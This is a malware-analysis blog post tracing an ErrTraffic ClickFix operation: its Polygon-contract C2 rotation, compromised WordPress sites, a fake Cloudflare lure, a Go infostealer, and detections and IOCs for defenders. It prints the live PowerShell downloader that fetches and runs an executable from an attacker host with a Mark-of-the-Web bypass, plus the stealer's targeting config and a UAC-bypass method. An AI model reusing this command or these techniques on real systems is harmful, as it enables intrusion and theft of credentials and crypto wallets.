---
title: "Hiding in Plain Ledger: Four Months of a ClickFix Operator's Blockchain C2"
date: 2026-07-16T20:00:00+05:30
slug: "clickfix-errtraffic-blockchain-c2"
draft: false
tags:
  - "EtherHiding"
  - "ClickFix"
  - "ErrTraffic"
  - "Blockchain C2"
  - "Malware Analysis"
  - "Reverse Engineering"
  - "Infostealer"
  - "Threat Intelligence"
  - "Golang"
cover:
  image: "/images/clickfix-errtraffic-blockchain-c2/cover.png"
  alt: "Hiding in Plain Ledger: Four Months of a ClickFix Operator's Blockchain C2"
  relative: false
ShowToc: true
TocOpen: false
---

To hide its command-and-control server, this operation writes the address onto a public
blockchain. That makes the C2 impossible to seize or sinkhole — but it also means every time
the operator moves servers, they leave a permanent, timestamped entry in a ledger anyone can
read. I pulled that ledger. It runs to **four months and roughly 127 delivery hosts from a
single smart contract**, and it was still updating the day I looked.

The framework itself is **ErrTraffic**, a ClickFix Malware-as-a-Service already documented
by [HudsonRock](https://www.infostealers.com/article/the-industrialization-of-clickfix-inside-errtraffic/),
[LevelBlue / SpiderLabs](https://www.levelblue.com/blogs/spiderlabs-blog/err-hiding-and-seek-how-errtraffic-v3-leverages-etherhiding-in-clickfix-campaign)
and [Sekoia](https://www.sekoia.com/blog/unveiling-errtraffic-inside-a-growing-clickfix-malware-distribution-framework);
the contract I trace is the one Sekoia calls the **"Analytics" cluster**. Building on that
work, this is an outside-in reconstruction of *how legible* such an operation is from public
data alone: the full on-chain rotation history, a July map of who is still infected, and the
payload the cluster is dropping today — all without touching attacker infrastructure.

![The full attack chain on one canvas: a compromised WordPress site reads a Polygon smart contract to resolve its delivery host, serves a fake Cloudflare CAPTCHA that writes PowerShell to the clipboard, the victim runs it, and a Go infostealer fetches its config from the C2](/images/clickfix-errtraffic-blockchain-c2/attack-chain.png)

*Figure 1: The chain. A hacked WordPress site (1) carries the injected loader in one of two
forms (plaintext or base64+XOR) and reads a Polygon contract to find the current delivery
host (2); that host serves a fake Cloudflare page that copies PowerShell to the clipboard
(3); the user runs it (4); a Go stealer lands, pulls its config from the C2 (5), and
uploads the stolen data (6). The same C2 channel can also push a next-stage payload (7) — a
loader capability present but off in this run. The only fixed point is the contract.*

## Background

**ErrTraffic** is a rented ClickFix kit (advertised by the actor "LenAI" on Exploit.IN since
December 2025) injected into compromised WordPress sites; it resolves its C2 from a Polygon
smart contract via **EtherHiding** rather than a hard-coded domain. The contract here,
`0x08207B087F61d7e95E441E15fd6d40BEfd6eD308`, is Sekoia's **"Analytics" cluster**: one stable
contract, C2 rotated roughly daily, historically dropping **Vidar** (April–May 2026), backed
by the `session-manager.php` WordPress MU-plugin backdoor. For the framework internals, the
MaaS economics and the backdoor, read the HudsonRock, LevelBlue and Sekoia write-ups linked
above. Everything below is my own hands-on tracking of *that contract*, current to July 2026.

## Summary

| | |
|---|---|
| **Framework** | ErrTraffic (ClickFix MaaS) — Sekoia's **"Analytics" cluster** |
| **Resolver** | Polygon contract `0x0820…D308`, selector `0x38bcdc1c` (`getURL()`), raced across public RPCs (*EtherHiding*) |
| **On-chain history** | **147 update transactions → ~127 distinct delivery hosts, 11 Mar → 16 Jul 2026, still live** |
| **Lure** | Fake Cloudflare "Verify you are human" page → clipboard PowerShell (*ClickFix*) |
| **Loader** | `powershell -w h … Invoke-WebRequest … SEE_MASK_NOZONECHECKS=1` |
| **Payload (July)** | 3 MB **Go 1.25.4** infostealer, symbol-obfuscated, fake self-signed cert (CN spoofs `etsy.com`) |
| **Config** | Not embedded — 20-browser + 48-rule grabber config delivered live by the C2 |
| **C2 / exfil** | `telegram[.]me/r7t3at` dead-drop → data uploaded over TLS to `kwt[.]ambiltogel[.]net`; `zewaplus[.]club` serves runtime modules (loader-capable) |
| **My additions** | full on-chain rotation timeline · July victim pivot (37 sites not previously listed) · live-injection confirmation · the current Go payload |

## The compromised sites

The traffic comes from legitimate WordPress sites, injected with a small script that runs
on **every page**, high in the document — the signature of a server-side compromise (the
`session-manager.php` MU-plugin backdoor documented by Monarx/LevelBlue/Sekoia), not a
single defaced page. Among the sites I saw serving it is a **Romanian municipal-government
subdomain**, `eficienta-energetica-leonida.primariapetrosani.ro`.

![The fake Cloudflare ClickFix overlay served live on the Romanian municipal-government subdomain eficienta-energetica-leonida.primariapetrosani.ro, with the WordPress admin bar still visible at the top of the page](/images/clickfix-errtraffic-blockchain-c2/clickfix-ro.png)

*Figure 2: The lure served live on a government subdomain (`primariapetrosani.ro`). The
WordPress chrome behind it confirms the CMS; each visit mints a fresh fake "Cloudflare ID"
to look convincing.*

I saw the injected loader in **two variants**, differing only in how they hide the same
contract, selector, and RPC list:

- **Variant A — plaintext.** Contract, selector, and RPC endpoints as readable string
  literals; trivial to spot on `view-source`.
- **Variant B — base64 + XOR.** The same values packed into an `atob()` blob, XOR-decoded
  at runtime before the `eth_call`. Nothing sensitive is visible in page source until it
  runs. (This is the obfuscation LevelBlue documents for v3.)

Because both share the contract, selector, and RPC list, searching victim pages for the
*domain* finds nothing, but searching for that **shared fingerprint** finds them all.

![A page-source view of the injected loader showing the plaintext-contract variant and, beside it, the base64+XOR variant that reconstructs the same contract address at runtime](/images/clickfix-errtraffic-blockchain-c2/injected-variants.png)

*Figure 3: The two observed variants. Left: contract, selector and RPC list in plaintext.
Right: the same values hidden in a base64+XOR `atob()` blob, rebuilt at runtime. The
constant across both is the fingerprint.*

## The on-chain C2

Here is the part I think is genuinely additive. Prior reports noted the Analytics cluster
rotates its C2 "roughly daily." Because every rotation is a **transaction that writes the
new host into the contract**, that tempo is not an estimate — it is a permanent public
ledger. I pulled the contract's full transaction history straight off the blockchain and
decoded the delivery host from each write.

The result: **147 update transactions resolving to ~127 distinct delivery hosts, from
11 March to 16 July 2026 — and the contract was still serving a fresh host at the moment I
checked.**

![A timeline showing one Polygon contract resolving to roughly 127 distinct delivery hosts across four months, with three eras: themed lures in March, throwaway junk domains through spring, and a tidy .pro naming scheme from July](/images/clickfix-errtraffic-blockchain-c2/rotation-timeline.png)

*Figure 4: One contract, four months. Every step is a real on-chain update. The naming
evolves — overtly themed lures in mid-March (`cloudflare-check.cfd`, `myverifyblog.sbs`),
then months of throwaway junk across `.cfd/.sbs/.bond/.lol/.xyz`, and from early July a
tidy six-letter `.pro` scheme (`kaloed → marjdl → mamkor → … → babelo`). The endpoint
marker is the host live when I read it.*

Two things stand out from the ledger:

- **The rotation is relentless and self-documenting.** Cleaning a victim site does nothing
  to this — the operator changes one on-chain value and every injected site follows. But
  the flip side is a gift to defenders: the contract *is* a timestamped history of the
  operator's infrastructure, readable by anyone, forever.
- **On 2026-07-11 the contract briefly pointed at `cal[.]magicalegyptwomen[.]com`** — a
  compromised legitimate site used directly as the delivery host, blurring the line between
  victim and infrastructure.

The blockchain read itself is not malicious infrastructure — it is a public query anyone
can make, which is exactly why it can't be seized or sinkholed. The things to act on are
the injected `eth_call` on the victim site and the host it resolves to.

## The ClickFix lure

The delivery host runs the ErrTraffic TDS. A request to `GET /api/?a=tds_cfg` returns a
config whose one decisive field is `show_windows: true` with the other OS landings
disabled — this instance serves Windows visitors only. Windows visitors get
`/landing/windows.html`, a fake of Cloudflare's "Verify you are human" page:

- title set to `Just a moment...`;
- a full-screen `<iframe>` at `z-index: 2147483647` with `allow="clipboard-write"`;
- a base64 + XOR (key 131) blob decoding to the loader (`window.__BW_MODE_RUN__`);
- 90-day cookies `_cf_verified` and `_wp_perf_ok` on "success".

It copies a PowerShell command to the clipboard, then tells the victim to press **Win+R**,
paste, and hit **Enter**. They think they are proving they're human; they are running the
downloader themselves — which is why nothing here trips Mark-of-the-Web or SmartScreen.

![The fake Cloudflare 'Verify you are human' overlay served on the real www.sbss.org.in site, showing the three-step instruction strip: press Win+R, press Ctrl+V to paste the verification code, press Enter to confirm](/images/clickfix-errtraffic-blockchain-c2/clickfix-sbss-org-in.png)

*Figure 5: The lure on a real victim (`www.sbss.org.in`): **Win+R → Ctrl+V → Enter**. The
clipboard is pre-loaded, so "pasting the verification code" runs the attacker's PowerShell.*

The clipboard command, served from the host's `?a=init` endpoint (`text/plain`, header
`X-Captcha-Mode: 2`), is:

```powershell
powershell -NoP -w h -ep bypass -c "$h='marj'+'dl.pro';$f=$env:TEMP+'\x.exe';
&('Invoke-WebRequest')('https://'+$h+'/2e9b57ef.exe') -OutFile $f -UseBasicParsing;
$env:SEE_MASK_NOZONECHECKS=1;& $f"
```

`-w h` hides the window; `'marj'+'dl.pro'` and `&('Invoke-WebRequest')` are string tricks
to dodge signature/AMSI matching; `SEE_MASK_NOZONECHECKS=1` suppresses the Mark-of-the-Web
prompt. It drops a ~3 MB executable to `%TEMP%\x.exe` and runs it.

## The payload

Sekoia observed this cluster delivering **Vidar** in April–May. The July sample
(`2e9b57ef.exe`, SHA-256 `0df0ccb0…306a74`) is different enough to note: a 64-bit PE built
with **Go 1.25.4**, not packed but **symbol-obfuscated**, carrying a **fake self-signed
Authenticode certificate** spoofing `etsy.com`. Whether this represents an evolution of the
cluster's payload or an affiliate swapping stealers, I can't say — so I describe it by
behaviour, not family name.

It resolves its APIs at runtime (PEB walk → `kernel32` → parse exports), so its import
table is empty and static analysis shows little. And **the binary carries no target
configuration** — no browser paths, no wallet names, no C2 URL. That is the Stealc/Vidar
server-side-config model: the targeting is pushed by the C2 per run. Its behaviour therefore
has to be read from the outside — the config the C2 hands it, and the hosts it talks to.

**1. Resolve the C2.** It fetched `telegram[.]me/r7t3at`, a Telegram page used as a
dead-drop — the channel holds no posts; the live C2 host sits in its bio field.

![The Telegram dead-drop channel r7t3at with one subscriber, whose description field contains the encoded C2 host in the ambiltogel[.]net domain](/images/clickfix-errtraffic-blockchain-c2/telegram-deaddrop.png)

*Figure 6: The dead-drop. The `r7t3at` channel carries no content — its bio holds the
current C2 host (`…ambiltogel[.]net`, prefixed with a short token). Reading a public Telegram
profile looks innocuous and needs no attacker server.*

**2. Pull the config.** It connected to `kwt[.]ambiltogel[.]net` over TLS and downloaded
three base64 JSON objects — master flags, browser list, grabber rules:

```json
{ "Cookies":1, "History":1, "cryptocurrency":1, "steal_discord":1,
  "telegram":1, "screenshot":1, "steam":1, "azure":1,
  "delete":0, "loader":0, "shell_code":0,
  "grabber_size_max":100352, "token":42767618 }
```

Enabled: browser cookies, history, crypto wallets, Discord tokens, Telegram, Steam, Azure,
screenshots. Disabled but *present*: `loader`, `shell_code`, `delete` — the same implant
can be tasked beyond stealing with one config change.

- **Browsers (20):** Chrome, Chromium, Vivaldi, Epic Privacy, CocCoc, Brave, Edge,
  360 Browser, QQBrowser, CryptoTab, Opera, Opera GX, Opera Crypto, Firefox, Zen, Pale Moon,
  Thunderbird, Avast Secure Browser, Comet (Perplexity's AI browser), Roblox WebView.
- **Grabber rules (48, 28 targets):** desktop wallets (Bitcoin `wallet.dat`, Electrum,
  Exodus, Atomic, Binance, Monero `*.keys`, …), hardware-wallet apps (Ledger Live, Trezor
  Suite, KeepKey, Tonkeeper), password managers (1Password, RoboForm, Bitwarden
  `data.json`), and Microsoft Sticky Notes.

![The C2-delivered configuration recovered from traffic: the master flag set, the 20-browser target list, and the 48-rule wallet and password-manager grabber ruleset](/images/clickfix-errtraffic-blockchain-c2/c2-config-recovered.png)

*Figure 7: The stealer's capabilities, read from the C2 config rather than the binary. The
disabled-but-present `loader` and `shell_code` flags show the implant can be tasked beyond
stealing.*

**3. Exfiltrate.** It packaged the harvested browser, wallet and token data and uploaded it
over TLS to the C2 `kwt[.]ambiltogel[.]net`.

**4. Fetch runtime modules.** A separate host, `zewaplus[.]club`, serves a payload **down**
to the victim rather than receiving an upload — most consistent with the runtime helper
modules such families pull on demand (e.g. browser-decryption DLLs). That same download
channel is what the `loader` flag uses: with it enabled, this host can push and run a
**next-stage payload**, turning the stealer into a delivery vehicle. In the observed config
`loader` was off, so no second stage was staged — but the capability is built in.

**5. Elevate and profile.** It used the fileless `ComputerDefaults.exe` UAC bypass to reach
high integrity and read host details (computer name, CPU, machine GUID, installed software).

## Who's still infected

The on-chain ledger gives the *infrastructure* side. For the *victim* side, I took July's
delivery hosts and pivoted them through public web-scan data — asking, for each host, which
sites had loaded it. The tell that a site belongs to *this* contract (and not some
coincidence) is simple: a site that loaded **two or more different rotating hosts** can only
have done so by reading the on-chain pointer as it changed.

![A matrix of compromised sites against the July delivery hosts, with filled cells showing which sites loaded which hosts; many sites loaded three or more rotating hosts](/images/clickfix-errtraffic-blockchain-c2/victim-pivot.png)

*Figure 8: The pivot. Each row is a site; each filled cell means it served that delivery
host at some point. Loading multiple rotating hosts is the signature that ties a site to
this contract's on-chain rotation.*

That pivot surfaced **64 sites that each loaded two or more rotating hosts** (203 sites in
total across the pivot, counting single-host observations), **37 of them not in the earlier
public lists**. Checking a sample of them, **19+ were still serving a live injection marker
at the time of writing** — both the plaintext and base64+XOR variants. One honest caveat:
many sites that did *not* show the marker returned a generic parking/WAF page, so a
non-detection is **inconclusive**, not proof-clean — the inject is served conditionally.

> 🌐 **The full victim list is published separately** (these are third-party victims, not
> attacker infrastructure): [compromised-sites.md](https://github.com/meltedinhex/detections/blob/master/errtraffic-analytics-cluster/compromised-sites.md)
> — tiered by confidence, defanged, with each site's observed delivery hosts and live/pivot
> status. Notify owners and the relevant CERTs; do not block them as C2.

## Detection and hunting

Delivery hosts rotate on-chain, so signatures keyed on one domain age out in a day. Anchor
on the *behaviour*: an `eth_call` to a Polygon RPC from a page, immediately followed by a
request to a fresh short host serving `/api/?a=tds_cfg` or `/landing/windows.html`; then
`powershell.exe` (hidden window) → `Invoke-WebRequest` → `%TEMP%\x.exe` with
`SEE_MASK_NOZONECHECKS=1`; then the `ComputerDefaults.exe` UAC bypass and a Telegram profile
fetched by a non-browser process. Site owners should hunt for the `session-manager.php`
MU-plugin backdoor and the injected loader markers (contract address + selector `38bcdc1c` +
`eth_call` + Polygon RPC list).

> 📦 **The full rule set ships in the open detections repo:**
> [`meltedinhex/detections` → `errtraffic-analytics-cluster`](https://github.com/meltedinhex/detections/tree/master/errtraffic-analytics-cluster)
> — YARA (injected loader, fake-Cloudflare landing, the July Go sample), Suricata network
> rules, KQL hunts for Defender/Sentinel, and machine-readable IOCs (CSV/JSON). Sekoia and
> LevelBlue publish complementary ScriptBlock and infrastructure signatures — use those too.

## Indicators (IOCs)

This cluster rotates its delivery host roughly daily, so treat the **on-chain contract** and
the **behavioural chain** as the durable signals — the domains below will have moved on by
the time you read this. Defanged; the full machine-readable set (CSV/JSON) and the victim
list are in the [detections repo](https://github.com/meltedinhex/detections/tree/master/errtraffic-analytics-cluster).

**Durable**

```text
Polygon contract   0x08207B087F61d7e95E441E15fd6d40BEfd6eD308
function selector  0x38bcdc1c   (getURL())
```

**Delivery hosts (July, rotating — will age out)**

```text
kaloed[.]pro   marjdl[.]pro   mamkor[.]pro   kaleda[.]pro   maloke[.]pro
babelo[.]pro   abrmot[.]pro   mekasa[.]pro   pokese[.]pro   merabs[.]pro   fesold[.]com
lashbou[.]pro  (suspected sibling infra)
```

**Stealer C2 / exfil / delivery**

```text
telegram[.]me/r7t3at        dead-drop resolver (C2 host in channel bio)
kwt[.]ambiltogel[.]net      stealer C2 (config + beacon + exfil)
zewaplus[.]club             serves runtime modules (loader-capable channel)
cal[.]snehamumbai[.]org     secondary gate (compromised site)
/api/?a=tds_cfg  ·  /api/index.php?a=init  ·  /landing/windows.html   (delivery endpoints)
```

**July payload (Go infostealer)**

```text
SHA-256  0df0ccb038bdceb9a33c402aa290698a3249da467f5ad98bd935b7a158306a74
SHA-1    b737728dc2eeccae2ea4d06060a3b3844cd478f7
MD5      c15075c52eb051af672410b081fb5e3c
signer   fake self-signed, CN spoofs etsy.com
```

**Host artifacts**

```text
env        SEE_MASK_NOZONECHECKS=1        (MOTW bypass)
process    ComputerDefaults.exe          (fileless UAC bypass)
cookies    _cf_verified  ·  _wp_perf_ok  (fake-CAPTCHA overlay)
WordPress  session-manager.php           (MU-plugin backdoor)
```

## What to do

**Site owners:** treat the site as compromised. Look for the `session-manager.php` MU-plugin
backdoor and the injected loader, remove them, rotate every CMS and hosting credential, and
patch the entry vector. Cleaning your site doesn't disturb the on-chain infrastructure, but
it stops your visitors being fed to the stealer.

**Anyone who "verified" by pressing Win+R and pasting a command:** assume the machine is
compromised. Rotate every password, invalidate sessions, migrate crypto wallets to fresh
seeds from a clean device, revoke Discord/Telegram/Steam tokens, and reimage.

---

*Full machine-readable IOCs, detection rules, and the victim list are in the
[detections repo](https://github.com/meltedinhex/detections/tree/master/errtraffic-analytics-cluster).
Indicators are a July-2026 snapshot of a fast-rotating cluster — the on-chain contract and
the behavioural chain are the durable signals.*
